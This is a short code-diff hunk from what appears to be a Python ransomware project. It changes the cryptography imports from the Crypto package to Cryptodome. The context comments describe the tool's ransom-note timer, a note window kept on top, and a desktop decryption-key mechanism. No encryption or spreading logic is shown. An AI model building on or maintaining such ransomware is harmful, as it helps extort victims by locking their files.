@@ -9,9 +9,9 @@ import time # used to time.sleep interval for ransom note & check desktop to dec
 import datetime # to give time limit on ransom note
 import subprocess # to create process for notepad and open ransom  note
 import win32gui # used to get window text to see if ransom note is on top of all other windows
-from Crypto.PublicKey import RSA
-from Crypto.Random import get_random_bytes
-from Crypto.Cipher import AES, PKCS1_OAEP
+from Cryptodome.PublicKey import RSA
+from Cryptodome.Random import get_random_bytes
+from Cryptodome.Cipher import AES, PKCS1_OAEP
 import base64
 import threading # used for ransom note and decryption key on dekstop
 
